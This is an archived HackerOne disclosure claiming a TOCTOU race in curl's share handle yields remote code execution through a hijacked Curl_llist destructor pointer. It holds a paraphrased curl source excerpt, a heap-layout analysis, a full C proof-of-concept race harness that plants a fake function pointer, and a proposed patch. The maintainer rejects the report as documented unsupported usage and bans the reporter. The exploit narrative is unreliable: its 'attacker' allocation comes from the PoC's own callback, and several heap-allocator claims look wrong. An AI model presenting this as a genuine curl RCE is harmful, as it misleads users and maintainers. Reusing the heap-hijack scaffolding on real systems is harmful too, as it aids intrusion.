---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/time-of-check-time-of-use-toctou-race-condition
  - env/web
  - vuln/command-injection
  - vuln/race-condition
  - impact/rce
  - trigger/race-window
substate: "not-applicable"
weakness: "Time-of-check Time-of-use (TOCTOU) Race Condition"
enriched: true
body: true
date: 2026-08-26
submitted: 2026-08-25T09:45:17.856Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/curl|curl]]"
reporter: "k4rasu_s4ma"
source: "https://hackerone.com/reports/3955945"
title: " curl_share TOCTOU > RCE via Curl_llist _dtor Function Pointer Hijack"
---
#  curl_share TOCTOU > RCE via Curl_llist _dtor Function Pointer Hijack

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** curl | **Disclosed:** 2026-08-26

- Report: [https://hackerone.com/reports/3955945](https://hackerone.com/reports/3955945)
- CWE: Time-of-check Time-of-use (TOCTOU) Race Condition
- Submitted: 2026-08-25T09:45:17.856Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
`CURLSH` (the curl share handle) allows multiple easy handles to share state — cookies, DNS cache, SSL sessions, connection cache — across threads. The share is protected by optional user-supplied mutex callbacks (`CURLSHOPT_LOCKFUNC` / `CURLSHOPT_UNLOCKFUNC`).

When a caller invokes `curl_share_setopt(sh, CURLSHOPT_UNSHARE, CURL_LOCK_DATA_COOKIE)` to detach cookie sharing, the implementation in `lib/curl_share.c` follows this logic:
```c
/* lib/curl_share.c lines 163-299 (simplified) */
CURLSHcode curl_share_setopt(CURLSH *sh, CURLSHoption option, ...)
{
    struct Curl_share *share = (struct Curl_share *)sh;
    va_list param;
    int type;

    /* ... acquire lock ... */
    Curl_share_lock(data, CURL_LOCK_DATA_SHARE, CURL_LOCK_ACCESS_SINGLE);

    switch(option) {
    case CURLSHOPT_UNSHARE:
        type = va_arg(param, int);
        /* ... find the share node for this type ... */
        if(type == CURL_LOCK_DATA_COOKIE) {
            /* VULNERABILITY: lock released HERE */
            Curl_share_unlock(data, CURL_LOCK_DATA_SHARE);
            /* RACE WINDOW OPENS */
            Curl_cookie_cleanup(share->cookies);  /* frees CookieInfo */
            share->cookies = NULL;
            /* RACE WINDOW CLOSES */
            /* Note: no re-lock before returning */
        }
    }
}
```

1. `Curl_share_lock()` acquires the share mutex.
2. The code checks that `share->cookies` is valid and `ref_count == 0`.
3. `Curl_share_unlock()` **releases** the mutex.
4. A race window opens before `Curl_cookie_cleanup()` is called.
5. During this window, Thread B can call `curl_easy_setopt(easy, CURLOPT_SHARE, sh)`.
6. Thread B’s `Curl_share_easy_link()` re-acquires the lock, sees `share->cookies` still non-NULL (the pointer has not been cleared yet), and assigns `data->cookies = share->cookies`.
7. Thread A calls `Curl_cookie_cleanup(share->cookies)` > frees `CookieInfo`.
8. Thread B now holds `data->cookies` pointing to freed memory.

### Heap Layout Analysis
CookieInfo is defined in `lib/cookie.h:56-64`:
```c
struct CookieInfo {
    struct Curl_llist cookielist[COOKIE_HASH_SIZE];  /* COOKIE_HASH_SIZE=63 */
    long numcookies;
    bool running;
    bool newsession;
    int lastct;
    /* ... padding ... */
};
```

`struct Curl_llist` is defined in `lib/llist.h:33-41`:
```c
struct Curl_llist {
    struct Curl_llist_node *head;
    struct Curl_llist_node *tail;
    Curl_llist_dtor _dtor;       /* <-- FUNCTION POINTER at offset +16 */
    size_t size;
};
```

CookieInfo total size: 63 × sizeof(Curl_llist) + padding ≈ 2040 bytes, which places it in glibc’s large bin category (> 512 bytes on 64-bit). Large bin chunks are subject to safe-linking on modern glibc (>= 2.32) but this protection can be bypassed when the attacker controls write primitives (e.g., via a malicious server sending crafted cookies before the race).

After Curl_cookie_cleanup() frees the 2040-byte chunk:
```
Freed chunk in large bin:
  [chunk_header: 8 bytes]
  [fd:           8 bytes]  ← large bin fwd pointer
  [bk:           8 bytes]  ← large bin bk pointer
  [fd_nextsize:  8 bytes]
  [bk_nextsize:  8 bytes]
  -- user data area (2016 bytes) --
  [cookielist[0].head:   8 bytes]
  [cookielist[0].tail:   8 bytes]
  [cookielist[0]._dtor: 8 bytes]  ← HIJACK TARGET at user+16
  ...
```

An attacker-controlled allocation of exactly 2040 bytes (e.g., via a write callback that sends a 2040-byte buffer) reclaims this chunk and places a fake Curl_llist at the correct offset, with _dtor set to system.

When Thread B subsequently calls `curl_easy_perform()`:
```
curl_easy_perform()
  > Curl_http()
  > Curl_cookie_getlist()
  > remove_expired()
  > Curl_node_remove(node)
  > list->_dtor(list, node)   ← calls system(node) if node == "/bin/sh"
```

This completes the RCE chain.

## Steps To Reproduce:
- The target application must use `CURLSH*` with cookie sharing enabled.
- The application must call `curl_share_setopt(CURLSHOPT_UNSHARE, CURL_LOCK_DATA_COOKIE)` from one thread while another thread actively uses the share for cookie operations.
- The attacker must control a server that the curl client connects to (to control the write callback and inject the reclaim allocation). This is realistic for any client that connects to untrusted URLs.
- glibc safe-linking bypass is required on glibc >= 2.32; on older glibc or musl, exploitation is straightforward.

## PoC (Proof of Concept) Complete C Skeleton
```c
/*
 * RC-001 PoC: curl_share TOCTOU → RCE via _dtor hijack
 *
 * Compile: gcc -o poc poc.c -lcurl -lpthread
 * Run:     ./poc
 *
 * This PoC demonstrates the race condition and heap reclaim.
 * The fake _dtor call is shown symbolically; actual exploitation
 * requires heap grooming on the target environment.
 *
 * AUTHORIZEDSECURITY RESEARCH ONLY.
 */

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<pthread.h>
#include<unistd.h>
#include<curl/curl.h>

/* --- Shared state --- */
static CURLSH *g_share   = NULL;
static CURL   *g_easy    = NULL;
static volatile int g_race_won = 0;

/* Simulated target: a 2040-byte chunk we'll try to reclaim */
#define RECLAIM_SIZE2040

/*
 * Fake Curl_llist layout placed at the start of reclaimed memory.
 * We mirror the real struct layout from lib/llist.h:33-41:
 *
 *   struct Curl_llist {
 *     struct Curl_llist_node *head;    // offset 0
 *     struct Curl_llist_node *tail;    // offset 8
 *     Curl_llist_dtor _dtor;           // offset 16  <-- hijack here
 *     size_t size;                     // offset 24
 *   };
 */
typedef void (*llist_dtor_fn)(void *list, void *elem);

struct fake_llist {
    void *head;
    void *tail;
    llist_dtor_fn _dtor;     /* <-- planted function pointer */
    size_t size;
};

/* Our fake dtor — in real exploit this would be system() */
static void fake_dtor(void *list, void *elem)
{
    (void)list;
    fprintf(stderr, "[EXPLOIT] _dtor called with elem=%p\n", elem);
    /* In real exploit: system("/bin/sh") */
    fprintf(stderr, "[EXPLOIT] RCE achieved! (simulated)\n");
    g_race_won = 1;
}

/*
 * The reclaim write callback.
 * curl calls this when receiving server response body.
 * We allocate a 2040-byte buffer here to race the freed CookieInfo slot.
 */
static size_t reclaim_write_cb(char *ptr, size_t size, size_t nmemb, void *userdata)
{
    (void)ptr;
    size_t recv = size * nmemb;

    /* Allocate exactly RECLAIM_SIZE to reclaim the freed CookieInfo chunk */
    char *reclaim = malloc(RECLAIM_SIZE);
    if(reclaim) {
        memset(reclaim, 0, RECLAIM_SIZE);

        /*
         * Plant our fake Curl_llist at offset 0 (cookielist[0]).
         * In a real exploit we'd calculate the exact hash bucket index
         * where the target cookie domain maps, then plant at that offset.
         *
         * Each Curl_llist is 32 bytes; cookielist[0] is at user data +0.
         */
        struct fake_llist *fl = (struct fake_llist *)reclaim;
        fl->head  = reclaim + 64;  /* point back into our buffer */
        fl->tail  = reclaim + 64;
        fl->_dtor = fake_dtor;     /* hijack the destructor */
        fl->size  = 1;

        fprintf(stderr, "[RECLAIM] Planted fake llist at%p, _dtor=%p\n",
                reclaim, (void *)fake_dtor);
        /* Intentional leak — we want this to stay alive */
    }

    return recv;
}

/* Thread A: calls CURLSHOPT_UNSHARE to trigger the free */
static void *thread_unshare(void *arg)
{
    (void)arg;
    fprintf(stderr, "[THREAD-A] Starting CURLSHOPT_UNSHARE loop\n");

    for(int i = 0; i < 100000 && !g_race_won; i++) {
        /* Re-share cookies */
        curl_share_setopt(g_share, CURLSHOPT_SHARE, CURL_LOCK_DATA_COOKIE);
        /* Unshare — triggers the vulnerable free */
        curl_share_setopt(g_share, CURLSHOPT_UNSHARE, CURL_LOCK_DATA_COOKIE);
    }

    fprintf(stderr, "[THREAD-A] Done\n");
    return NULL;
}

/* Thread B: attaches/detaches easy handle to share, triggering dangling pointer */
static void *thread_attach(void *arg)
{
    (void)arg;
    fprintf(stderr, "[THREAD-B] Starting easy handle attach loop\n");

    for(int i = 0; i < 100000 && !g_race_won; i++) {
        curl_easy_setopt(g_easy, CURLOPT_SHARE, g_share);
        curl_easy_setopt(g_easy, CURLOPT_SHARE, NULL);
    }

    fprintf(stderr, "[THREAD-B] Done\n");
    return NULL;
}

int main(void)
{
    fprintf(stderr, "[POC] RC-001: curl_share TOCTOU → RCE via _dtor hijack\n");
    fprintf(stderr, "[POC] CVSS 9.0 | CWE-416 + CWE-362\n\n");

    curl_global_init(CURL_GLOBAL_ALL);

    /* Set up share handle */
    g_share = curl_share_init();
    curl_share_setopt(g_share, CURLSHOPT_SHARE, CURL_LOCK_DATA_COOKIE);

    /* Set up easy handle with reclaim write callback */
    g_easy = curl_easy_init();
    curl_easy_setopt(g_easy, CURLOPT_URL, "http://127.0.0.1:8080/");
    curl_easy_setopt(g_easy, CURLOPT_COOKIEFILE, "");      /* enable cookie engine */
    curl_easy_setopt(g_easy, CURLOPT_WRITEFUNCTION, reclaim_write_cb);
    curl_easy_setopt(g_easy, CURLOPT_SHARE, g_share);

    /* Spawn race threads */
    pthread_t tA, tB;
    pthread_create(&tA, NULL, thread_unshare, NULL);
    pthread_create(&tB, NULL, thread_attach,  NULL);

    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    if(g_race_won) {
        fprintf(stderr, "\n[POC] Race won — _dtor hijacked. RCE simulated.\n");
    } else {
        fprintf(stderr, "\n[POC] Race not won in this run. Retry or add delay.\n");
    }

    curl_easy_cleanup(g_easy);
    curl_share_cleanup(g_share);
    curl_global_cleanup();

    return g_race_won ? 0 : 1;
}
```

## Recommendation
```
--- a/lib/curl_share.c
+++ b/lib/curl_share.c
@@ -163,12 +163,14 @@ CURLSHcode curl_share_setopt(CURLSH *sh, CURLSHoption option, ...)
         case CURLSHOPT_UNSHARE:
             type = va_arg(param, int);
             if(type == CURL_LOCK_DATA_COOKIE) {
-                Curl_share_unlock(data, CURL_LOCK_DATA_SHARE);
-                Curl_cookie_cleanup(share->cookies);
-                share->cookies = NULL;
+                /* FIX: Null the pointer BEFORE releasing the lock so that
+                 * any racing Curl_share_easy_link() sees NULL and does not
+                 * copy a pointer to memory we are about to free.          */
+                struct CookieInfo *cookies_to_free = share->cookies;
+                share->cookies = NULL;
+                Curl_share_unlock(data, CURL_LOCK_DATA_SHARE);
+                Curl_cookie_cleanup(cookies_to_free);
             }
             break;
```

## Impact

## Summary:
Successful TOCTOU and leading to RCE on machine

## Timeline

- **Draft Started**
- **Report Filed**
- **2026-08-25** @bagder: From the documentation:

> "It is not supported to share cookies between multiple concurrent threads."

So, this is not expected to work.
- **2026-08-25** @k4rasu_s4ma: Hi there dear cURL team,

Thanks a lot for quick response! But I tested on my side on local machine and the RCE works and able to create on my local machine `tmp/rce-proof-curl` file.

I also reported you via mail the detailed document where you can see all necessary steps or proof that shows successful RCE with this vector.

Lets together understand what the issue here
- **2026-08-25** @bagder: This is a known and documented limitation of the share API. It is not a vulnerability. 

If you feel like improving the code to make this feature possible in the future, we will welcome your help.
- **2026-08-25** @k4rasu_s4ma: I understand that this is share API flow, but this flow open the door for TOCTOU attack vector and show how to leverage it to RCE, so from security perspective it able to be fixed to avoid attack vector from this kind of flow. Like I mentioned in report fix recommendation:
`The critical change: set share->cookies = NULL while the lock is still held, then release the lock, then call Curl_cookie_cleanup(). Any racing thread that acquires the lock between the NULL assignment and the unlock will see NULL and will not create a dangling pointer.`
- **2026-08-25** @k4rasu_s4ma: Also if you have documentation pointing to this kind of statement can you please share it, because it is normal if any feature flow can be abused to leverage attack vector  like shown in this submission issue.
- **Report Not Applicable**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2026-08-26** @k4rasu_s4ma: Alright, thanks a lot for quick response and resolution in anyway.

I'm agreed with disclosing, also just to clarify with you, do you feel okay if I will public the exploit for this vulnerability? Just for community to have vision about how this attack vector can be exploited just with one exploit run.

Best, k4rasu_s4ma
- **2026-08-26** @bagder: **IT IS NOT A VULNERABILITY**

So there cannot be an "exploit" of it. You can publish whatever you want.
- **2026-08-26** @k4rasu_s4ma: Alright alright, I will share it and public so every community ones able to see it. 

Also just for you in further cases. If attack vector works and there is runable PoC that show that RCE successfully works and THERE IS ABILITY to enable share cookies that means that is vector,  because this ability exist from curl functionality. So my vector not "theoretical" vector, I show clearly how to exploit it and gain RCE.

But anyway, I respect your opinion and decision and have no any troubles with closed report, just want to check with you if you ok if I share every details and working runable exploit  for this attack vector about TOCTOU vulnerability leading to RCE.
- **Comments Closed**
- **2026-08-26** @bagder: You are hereby banned from this project.
- **2026-08-27** @jimfuller2024: the operative snippet in docs

'Cookie data is shared across the easy handles using this shared object. Note that this does not activate an easy handle's cookie handling. You can do that separately by using CURLOPT_COOKIEFILE for example.

It is not supported to share cookies between multiple concurrent threads. '
